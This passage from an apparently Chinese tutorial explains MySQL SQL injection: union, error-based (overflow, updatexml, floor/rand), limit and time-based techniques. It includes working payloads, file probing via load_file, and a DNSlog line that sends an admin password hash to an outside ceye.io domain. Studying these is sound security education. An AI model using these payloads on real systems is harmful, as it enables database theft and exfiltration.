|</span><br><span class="line">+-----------------------+</span><br><span class="line">| <span class="number">67890</span>                 |</span><br><span class="line">+-----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">+-----------------------+</span><br><span class="line">| right(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">2</span>) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| <span class="number">90</span>                    |</span><br><span class="line">+-----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select left(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>);</span><br><span class="line">+----------------------+</span><br><span class="line">| left(<span class="string">&#x27;1234567890&#x27;</span>,<span class="number">5</span>) |</span><br><span class="line">+----------------------+</span><br><span class="line">| <span class="number">12345</span>                |</span><br><span class="line">+----------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h5 id="isnull-exp"><a href="#isnull-exp" class="headerlink" title="isnull(exp)"></a>isnull(exp)</h5><p>如果exp为null返回1，否侧返回0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select isnull(<span class="number">1</span>+<span class="number">1</span>);</span><br><span class="line">+-------------+</span><br><span class="line">| isnull(<span class="number">1</span>+<span class="number">1</span>) |</span><br><span class="line">+-------------+</span><br><span class="line">|           <span class="number">0</span> |</span><br><span class="line">+-------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select isnull(<span class="number">0</span>);</span><br><span class="line">+-----------+</span><br><span class="line">| isnull(<span class="number">0</span>) |</span><br><span class="line">+-----------+</span><br><span class="line">|         <span class="number">0</span> |</span><br><span class="line">+-----------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p><strong>可以配合注入来判断文件是否存在以及是否有权限读取文件。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * <span class="keyword">from</span> math where id=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">0</span>,concat(<span class="number">0x7e</span>,isnull(LOAD_FILE(<span class="string">&#x27;/Users/apple/Desktop/2.txt&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">0</span>);</span><br><span class="line">ERROR <span class="number">1105</span> (HY000): XPATH syntax error: <span class="string">&#x27;~1~&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="ifnull-expr1-expr2"><a href="#ifnull-expr1-expr2" class="headerlink" title="ifnull(expr1,expr2)"></a>ifnull(expr1,expr2)</h5><p>假如expr1不为NULL，则IFNULL()的返回值为expr1; 否则其返回值为expr2。IFNULL()的返回值是数字或是字符串。</p><h4 id="常用符号"><a href="#常用符号" class="headerlink" title="常用符号"></a>常用符号</h4><h5 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h5><p>二进制数上进行计算的运算符。位运算会先将操作数变成二进制数，进行位运算。然后再将计算结果从二进制数变回十进制数。</p><ul><li><p>按位或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>|<span class="number">9879</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>|<span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line">|   <span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li><li><p>按位异或</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>^<span class="number">9879</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>^<span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line">|   <span class="number">9879</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li><li><p>按位与</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">0</span>&amp;<span class="number">5464</span>;</span><br><span class="line">+--------+</span><br><span class="line">| <span class="number">0</span>&amp;<span class="number">5464</span> |</span><br><span class="line">+--------+</span><br><span class="line">|      <span class="number">0</span> |</span><br><span class="line">+--------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> set (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></li></ul><p>0与任何的数字A按位或、异或都是A数字。</p><p>0与任何数字按位与都是0。</p><p>逻辑运算符</p><p>逻辑运算符用来判断表达式的真假。如果表达式是真，结果返回 1。如果表达式是假，结果返回 0。</p><ul><li><p>与运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span>;</span><br><span class="line">+---------+</span><br><span class="line">| <span class="number">2</span> <span class="keyword">and</span> <span class="number">0</span> |</span><br><span class="line">+---------+</span><br><span class="line">|       <span class="number">0</span> |</span><br><span class="line">+---------+    </span><br><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span>;   </span><br><span class="line">+---------+     </span><br><span class="line">| <span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span> |      </span><br><span class="line">+---------+      </span><br><span class="line">|       <span class="number">1</span> |      </span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure></li><li><p>或运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">2</span> <span class="keyword">or</span> <span class="number">0</span>;</span><br><span class="line">  +--------+</span><br><span class="line">  | <span class="number">2</span> <span class="keyword">or</span> <span class="number">0</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  |      <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  </span><br><span class="line">  mysql&gt; select <span class="number">2</span> <span class="keyword">or</span> <span class="number">1</span>;</span><br><span class="line">  +--------+</span><br><span class="line">  | <span class="number">2</span> <span class="keyword">or</span> <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br><span class="line">  |      <span class="number">1</span> |</span><br><span class="line">  +--------+</span><br></pre></td></tr></table></figure></li><li><p>非运算符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="keyword">not</span> <span class="number">1</span>;</span><br><span class="line">  +-------+</span><br><span class="line">  | <span class="keyword">not</span> <span class="number">1</span> |</span><br><span class="line">  +-------+</span><br><span class="line">  |     <span class="number">0</span> |</span><br><span class="line">  +-------+</span><br><span class="line">  </span><br><span class="line">  mysql&gt; select !<span class="number">0</span>;</span><br><span class="line">  +----+</span><br><span class="line">  | !<span class="number">0</span> |</span><br><span class="line">  +----+</span><br><span class="line">  |  <span class="number">1</span> |</span><br><span class="line">  +----+</span><br></pre></td></tr></table></figure></li></ul><h4 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h4><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>原理：</p><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为<code>union</code>或<code>union all</code>。</p><p>条件：</p><p>页面有回显、有占位符</p><p>占位符：</p><p>从数据库中取出某些输入能够显示到页面上的某一个位置。</p><p>步骤：</p><ul><li><p>判断是否有注入</p></li><li><p>判断是数字型注入还是字符型注入</p></li><li><p>猜测查询列数</p><p>列数小,正常回显,num大,不回显。</p></li><li><p>寻找占位</p></li><li><p>获取所有数据库名</p></li><li><p>获取指定数据的所有表名</p></li><li><p>获取指定数据库的指定数据表的所有字段名</p></li><li><p>获取指定数据库的指定数据表的所有的内容</p></li></ul><h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><ul><li><p>BIGINT等数据类型溢出</p><ul><li><p>原理：</p><ul><li><p>在mysql5.5之前，整形溢出是不会报错的，只有版本号大于5.5.5时，才会报错。</p><p>在mysql中要想获取BIGINT最大值，可以直接0按位置取反,超出最大值就会报错，而sql语句在执行成功的时候会返回0，取反之后就会变成1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select (select * from (select user())x);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>超出最大值就会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(~(0) + 1)&#39;</span><br></pre></td></tr></table></figure></li><li><p>SQL注入利用</p><p>组合好逐位取反和逻辑取反运算，我们就能利用溢出错误来成功的注入查询。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0+!(select*from(select user())x);</span><br><span class="line">ERROR 1690 (22003): BIGINT value is out of range in &#39;(~(0) + (not((select &#39;root@localhost&#39; from dual))))&#39;</span><br></pre></td></tr></table></figure><p>返回0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from(select user())x</span><br></pre></td></tr></table></figure><p>返回1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!(select*from(select user())x);</span><br></pre></td></tr></table></figure><p>溢出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~0+!(select*from(select user())x);</span><br></pre></td></tr></table></figure><p>同理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!(select*from(select user())x)-~0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select username, password from users where id&#x3D;&#39;1&#39; or !(select*from(select user())x)-~0;</span><br></pre></td></tr></table></figure></li></ul><p>注意：</p><p>当MySQL版本大于或等于5.5.53时，数据溢出注入无效。</p></li><li><p>exp()函数：当传入的数值大于709的时候就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</span><br></pre></td></tr></table></figure></li><li><p>exp函数与整形溢出结合</p><ul><li><p>mysql&gt;5.5.53时，则不能返回查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 5.7.26    |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(~(select * from (select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select &#96;x&#96;.&#96;user()&#96; from (select user() AS &#96;user()&#96;) &#96;x&#96;)))&#39;</span><br></pre></td></tr></table></figure></li><li><p>mysql5.5.47可以在报错中返回查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#96;a&#96;.&#96;x&#96;)) - ~(0))&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>xpath语法错误</p><ul><li><p>原理：</p><p>mysql&gt;5.1.5，提供两个函数来修改和查询XML，updatexml用来修改文档，extractvalue用来按照xpath语法查询节点内容。</p><ul><li><p>updatexml()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XMLdocument, XPathstring, new_value);</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)</span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据</span><br></pre></td></tr></table></figure><p>UPDATEXML第二个参数需要Xpath格式的字符串，如果不符合就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26~&#39;</span><br></pre></td></tr></table></figure></li><li><p>extractvalue()对XML文档进行查询的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExtractValue(xml_frag, xpath_expr)</span><br><span class="line">第一个参数：可以传入目标xml文档</span><br><span class="line">第二个参数：用Xpath路径法表示的查找路径</span><br></pre></td></tr></table></figure><p>寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误的话，就会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT extractvalue(&#39;22&#39;,concat(&#39;~&#39;,(select version())));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.26&#39;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>主键重复</p><ul><li><p>基本函数</p><ul><li><p>rand()</p><p>rand()随机产生一个0～1的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand();</span><br><span class="line">+----------------------+</span><br><span class="line">| rand()               |</span><br><span class="line">+----------------------+</span><br><span class="line">| 0.006128073675677249 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand();</span><br><span class="line">+---------------------+</span><br><span class="line">| rand()              |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.33123136435750067 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>rand(0)产生一个固定的0～1的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand(0);</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select rand(0);</span><br><span class="line">+---------------------+</span><br><span class="line">| rand(0)             |</span><br><span class="line">+---------------------+</span><br><span class="line">| 0.15522042769493574 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>有几条数据就会返回几条随机数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select rand() from math;</span><br><span class="line">+----------------------+</span><br><span class="line">| rand()               |</span><br><span class="line">+----------------------+</span><br><span class="line">|   0.6377726314941167 |</span><br><span class="line">|   0.1951690951317261 |</span><br><span class="line">|  0.06252761190992558 |</span><br><span class="line">|   0.7271308048880946 |</span><br><span class="line">|  0.44807121944434125 |</span><br><span class="line">| 0.058963713291067366 |</span><br><span class="line">|   0.9506049388559581 |</span><br><span class="line">+----------------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select *  from math;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">|    3 | chengxian |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">+------+-----------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>floor()该函数返回X的最大整数值，但不能大于X</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select floor(5.23);</span><br><span class="line">+-------------+</span><br><span class="line">| floor(5.23) |</span><br><span class="line">+-------------+</span><br><span class="line">|           5 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>floor() 返回小于等于该值的最大整数,rand返回0到1.乘2自然返回0到2,加上floor自然返回0到1.所以我们基本确认要么返回0要么返回1。</p><p><code>floor(rand(0)*2)</code>:具有确定性</p><p><code>floor(rand()*2)</code>:具有不确定性</p></li></ul></li><li><p>原理：</p><p>count()和group by在遇到rand()产生的重复值时报错。</p><p><code>Select name,count(*)  from student group by name</code>    </p><p>这条语句的作用就是从<code>student</code>表中<code>select</code>出<code>name</code>和<code>count</code>(count会具体返回一个数字).这个数字的多少就是根据<code>grop by</code> 后面的<code>name</code>来决定。也就是说最终他会返回姓名以及每一个姓名出现的次数。</p><p>重点是这语句具体是怎么执行的？是如何计算出我们查询的不同字段(name)的个数的？</p><p>发现mysql遇到该语句时会建立一个虚拟表。该虚拟表有两个字段，一个是分组的 <code>key</code> ，一个是计数值 <code>count(*)</code></p><p><strong>在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加1，不存在则新建该分组</strong></p><p>同理我们根据<code>floor(rand(0)*2)</code>进行分组—–这里要注意<code>floor(rand(0)*2)</code>执行之后是有规律的返回0或者1。</p><p>根据之前rand的顺序—011011011,我们来梳理一下为什么会报错</p><ul><li><p>第一次计算执行一次产生0,表中不存在任何数据,然后开始插入</p></li><li><p>插入的时候会进行第二次计算,所以在执行一次产生1插入</p></li><li><p>第三次计算产生1因为第二次产生了1所以本次就无需在执行一次计算,直接在原来的基础上加1就可以,不会在进行一次计算</p></li><li><p>第四次产生0,原来的表中没有0所以要进行插入操作,会再一次计算产生1.所以会再次产生一个分组,<strong>注意是产生一个分组,不是单纯的产生一个数值</strong></p><p>此时此刻就报错了。因为我们已经有了一个1分组了。注意是有了一个1分组了。在添加一个1分组会报错。</p></li></ul><p>注意：</p><p>sql语句在执行之后建立虚表分两种情况：</p><p>1、表中没有对应的列，执行一次查询，一次插入，<code>floor(rand(0)*2)</code>会被执行两次。</p><p>2、表中有对应的列，执行一次查询，一次插入，<code>floor(rand(0)*2)</code>只会被执行一次。</p><p>主键重复的最少前提就是虚拟表中要有三条数据才会产生重复,也就是group by执行至少三次,也就是对应的group by的表要有至少三条数据</p></li></ul></li><li><p>几何函数</p><p>geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()等函数</p><p>这些函数报错原理大多都相同，都是不满足参数需求而导致的报错。</p></li><li><p>DNSlog外带配合报错注入</p><p>作为攻击者，提交注入语句，让数据库把需要查询的值和域名拼接起来，然后发生DNS查询，我们只要能获得DNS的日志，就得到了想要的值。所以我们需要有一个自己的域名，然后在域名商处配置一条NS记录，然后我们在NS服务器上面获取DNS日志即可。用ceye.io这个平台，这个平台就集成了Dnslog的功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;mysql.php?id&#x3D;1 union select 1,2,load_file(CONCAT(&#39;\\&#39;,(SELECT hex(pass) </span><br><span class="line">FROM test.test_user WHERE name&#x3D;&#39;admin&#39; LIMIT 1),&#39;.mysql.steady.ceye.io\abc&#39;))</span><br></pre></td></tr></table></figure><p>load_file函数在Linux下是无法用来做dnslog攻击的。</p><p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p><p>\sss.xxx\test\</p><p>这也就解释了为什么CONCAT()函数拼接了4个<code>\</code>了，因为转义的原因，4个就变<code>\</code>成了2个<code>\</code>，目的就是利用UNC路径。</p><p>tips：</p><p>因为Linux没有UNC路径这个东西，所以当MySQL处于Linux系统中的时候，是不能使用这种方式外带数据的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。</span><br></pre></td></tr></table></figure></li></ul><h5 id="Limit注入"><a href="#Limit注入" class="headerlink" title="Limit注入"></a>Limit注入</h5><ul><li><p>常用函数</p><ul><li>limit [位置偏移量,]行数</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math limit 1,2;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">+------+-----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from math limit 1,3;</span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">+------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><p>benchmark</p><p>benchmark函数有两个参数，第一个是执行次数，第二个是要测试的函数或者表达式 .</p></li></ul></li><li><p>limit注入</p><ul><li><p>注入点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from math limit 1,[可控点] </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select*from math order by id desc limit 1,2</span><br></pre></td></tr></table></figure><p>limit后面能够拼接的函数只有into和procedure。</p></li><li><p>无order by关键字</p><ul><li><p>使用union联合查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from math order by id desc limit 0,1 union select username from users;</span><br></pre></td></tr></table></figure></li><li><p>报错注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1  procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure></li><li><p>延时注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1 procedure analyse(if(substring(version(),1,1)&#x3D;5,benchmark(50000000,encode(&#39;msg&#39;,&#39;by 5 second&#39;)),0),1)</span><br></pre></td></tr></table></figure><p>只能使用BENCHMARK，而不能使用sleep</p></li></ul></li><li><p>有order by关键字</p><p>无法使用union关键字，可尝试盲注或者报错</p><ul><li><p>报错注入(5.0.0&lt; MySQL &lt;5.6.6版本)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *  from math order by id desc limit 0,1 procedure 